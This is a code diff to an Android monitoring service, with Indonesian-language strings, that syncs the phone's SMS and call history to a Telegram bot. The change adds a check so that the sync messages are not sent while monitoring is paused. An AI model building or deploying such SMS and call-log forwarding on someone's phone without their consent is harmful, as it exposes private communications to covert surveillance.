@@ -5431,15 +5431,16 @@ class MonitoringService : Service() {
                 appendLine()
                 appendLine("Semua perintah ada di menu bot — ketuk /help kapan saja.")
             }
+            val pausedAtTail = try { preferencesManager.monitoringPaused } catch (_: Exception) { false }
             if (initialOk && !smsReadFailed && !callReadFailed && !smsTruncated && !callTruncated) {
-                sendToTelegram(completeMessage)
+                if (!pausedAtTail) sendToTelegram(completeMessage)
                 initialSyncRetryAt = 0L
                 initialStartSent = false
                 initialPartialNotified = false
                 preferencesManager.setInitialSyncDoneSync(true)
             } else {
                 initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 30 * 60_000L
-                if (!initialPartialNotified) {
+                if (!pausedAtTail && !initialPartialNotified) {
                     initialPartialNotified = sendToTelegram("Sinkron riwayat terkirim sebagian. Sisanya menyusul otomatis.")
                 }
             }
